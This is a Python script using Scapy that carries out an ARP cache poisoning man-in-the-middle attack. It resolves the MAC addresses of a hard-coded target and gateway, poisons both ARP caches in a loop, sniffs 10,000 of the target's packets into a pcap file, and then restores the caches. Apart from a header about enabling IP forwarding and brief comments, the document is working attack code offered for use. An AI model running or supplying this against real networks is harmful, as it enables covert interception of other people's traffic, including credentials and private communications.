
######################################################
##  IN ORDER TO MAKE THE SCRIPT WORK                ##
##  ENABLE: echo 1 > /proc/sys/net/ipv4/ip_forward  ##
######################################################

from scapy.all import *
import os
import sys
import threading
import signal
import time

interface = "eth0"
target_ip = "192.168.182.131"
gateway_ip = "192.168.182.2"
packet_count = 10000

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

# emit an APR request to the specified IP address in order to resolve the MAC address
# associated with it
def get_mac(ip_address):
    # srp (send and receive packet)
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src    
    return None

# builds up ARP requests for poisoning both the target IP and the gateway
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poisoning. [CTRL-C to stop]"
    
    # we keep emitting these ARP requests in a loop to make sure that the respective ARP cache
    # entries remain poisoned for the duration of the attack
    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print "[*] ARP poison attack finished."
    return

# sends out the appropriate ARP packets to the network broadcast address to reset the 
# ARP caches of the gateway and the target machines
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print "[*] restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)     
    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print "[!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s as MAC Address %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print "[!!] Failed to get target MAC. Exiting"
    sys.exit(0)
else:
    print "[*] Target %s as MAC Address %s" % (target_ip, target_mac)

# start poison thread
poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()
time.sleep(5)

try:
    print "[*] Starting sniffer for %d packets" % packet_count
    # filter to capture traffic only from our target IP address
    bpf_filter = "ip host %s" % target_ip
    # start the sniffer
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    # write out the captured packets
    wrpcap('arper.pcap', packets)
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)

    

    
























